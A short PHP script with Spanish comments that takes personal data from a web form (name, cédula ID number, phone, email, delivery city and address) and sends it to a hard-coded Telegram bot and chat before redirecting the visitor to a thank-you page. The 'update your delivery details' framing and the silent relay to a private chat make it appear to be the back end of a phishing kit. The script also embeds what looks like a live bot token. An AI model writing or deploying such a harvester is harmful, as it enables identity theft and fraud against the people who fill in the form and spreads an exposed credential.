<?php
// Datos del bot de Telegram
$token = "7638665235:AAHjcWInBDFFJ9cRd8eFM2MeaQpcVrvzpoE";  // Reemplaza con tu token de bot
$chat_id = "-4678292542";  // Reemplaza con tu chat_id

// Recolectar los datos enviados desde el formulario
$nombre = $_POST['nombre'];
$apellido = $_POST['apellido'];
$cedula = $_POST['cedula'];
$telefono = $_POST['telefono'];
$email = $_POST['email'];
$ciudad = $_POST['ciudad'];
$direccion = $_POST['direccion'];

// Crear el mensaje para enviar a Telegram
$mensaje = "Actualizar Datos:\n\n".
           "Nombre: $nombre\n".
           "Apellido: $apellido\n".
           "Cédula: $cedula\n".
           "Teléfono: $telefono\n".
           "Correo: $email\n".
           "Ciudad de Entrega: $ciudad\n".
           "Dirección de Entrega: $direccion";

// URL para enviar el mensaje a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";

// Configurar los parámetros para enviar a Telegram
$datos = [
    'chat_id' => $chat_id,
    'text' => $mensaje
];

// Enviar el mensaje usando cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datos));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Ejecutar la solicitud cURL
$resultado = curl_exec($ch);
curl_close($ch);

// Verificar si el mensaje se envió correctamente
if ($resultado) {
    // Redirigir a una página de éxito
    header("Location: gracias.html");
    exit();
} else {
    // Redirigir a una página de error
    header("Location: error.html");
    exit();
}
?>
